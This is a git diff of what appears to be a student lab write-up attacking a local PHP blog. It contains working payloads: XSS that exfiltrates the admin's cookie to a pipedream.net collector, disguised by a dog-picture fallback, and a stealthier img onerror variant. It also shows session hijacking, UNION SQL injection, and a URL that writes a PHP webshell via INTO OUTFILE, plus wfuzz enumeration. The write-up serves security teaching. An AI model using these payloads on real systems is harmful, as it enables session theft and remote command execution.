@@ -10,6 +10,7 @@ This allowed us to inject some javascript code in the field to display a simple 
 #### Description of the attack
 
 The command that we decided to insert in the "text" field to steal the administrator's cookie is:
+
 ```javascript
 <script>var backup_url='http://media.istockphoto.com/photos/head-shot-of-cute-purebred-rottweiler-dog-pup-hanging-with-paws-over-picture-id1096889426';document.write('<img onerror="this.onerror=null;this.src=backup_url;" src="http://en8mgdzvtyrzg.x.pipedream.net/?'+document.cookie+'  "/>');</script>
 ```
@@ -21,6 +22,12 @@ When the administrator checks the comments page, the first source of the image w
 The thing is, the victim will only see that someone uploaded a picture of a dog because a backup url is used in the `onerror` attribute of the `<img/>` tag to prevent showing a broken image which could be suspicious.
 
 ![Dog picture viewed by the administrator ](assets/dog-picture.PNG)
+
+If we wanted to be even more stealthy, we could just accomplish the same thing but without displaying anything to the admin:
+
+```html
+<img src=x onerror=this.src='http://en8mgdzvtyrzg.x.pipedream.net/?cookie='+document.cookie>
+```
 
 All we need then, to hijack the administator's session, is to replace the value of our `PHPSESSID`cookie, in the dev tools of the web browser, by the value set in the administrator's cookie.
 
@@ -73,6 +80,16 @@ The X-Frame-Options countermeasure is, as for the CSP countermeasure, a bit clie
 #### Known Vulnerabilities
 
 First of all, we tried to find vulnerabilities in the admin form, for example by escaping password verification, but this method was not very successful. Then, we found that the URL was not sanitized, meaning that some commands can be executed through the path. In this lab, we need to perfom SQL injections, meaning that we will execute SQL queries inside the URL.
+To be able to inject SQL commands in the URL, we have to add an "union" keyword at the end of it and pursue with the rest of our custom query.
+Then, the first step is to determine the number of columns that are returned by the first part of the query in order to not create an error. To do that, we have to do some kind of "bruteforce" by adding another "select" and increasing the number of queried fields until no error appears on the web page anymore:
+
+![The wrong amount of columns leads to an error](assets/wrong-column-number.PNG)
+
+Finally, after adding 4 columns, no error is displayed. This means that we guessed the correct number:
+
+![The correct amount of columns displays no error](assets/correct-column-number.PNG)
+
+However, the id=0 seems to be the only one letting us inject SQL commands. We guess that it is because it doesn't correspond to any actual post on the comment section.
 
 #### Exploiting File Privilege
 
@@ -91,18 +108,19 @@ Then, another vulnerability that could harm the system would be to execute unaut
 `http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22`
 
 By doing this, the mysql user will create in our `css` folder, which has write access for everyone, a php file to launch a shell on the server. We cannot upload our file directly on the root of the project
-since we don't have writing permissions. We can explore directory trees with various tools, an interesting one would be python module wfuzz, which allow performing directory listings.
+since we don't have writing permissions. Directory trees can be explored with the help of various tools. An interesting one would be the python module `wfuzz` which allows to perform directory listings on web servers.
 
 ```bash
 $pip install wfuzz
-$wfuzz -w urls.txt http://localhost/FUZZ # the tool will replace the word FUZZ by every word in our dictionary 
+$wfuzz -w urls.txt http://localhost/FUZZ # the tool will replace the word FUZZ with every word in our dictionary 
 ```
 
-with `url.txt` a file containing common directory names for websites, we can find some dictionaries easily on Github, example with this [fuzzdb project](https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/filename-dirname-bruteforce)
+With `url.txt`, a file containing common directory names for websites, we can enumerate the subdirectories on the web server.
+We can easily find some dictionary lists on Github: example with this [fuzzdb project](https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/filename-dirname-bruteforce)
 
 ![Fuzzing a website](assets/wfuzz.png)
 
-We can then perform SQL injection on each directory we found. Once the script tries to inject the payload in `css` folder, we can see that it appeared into our directory :
+We can then perform SQL injection on each directory we found. Once the script tries to inject the payload in the `css` folder, we can see that it appeared into our directory :
 
 ![Webshell file located in css folder](assets/webshell-file.png)
 
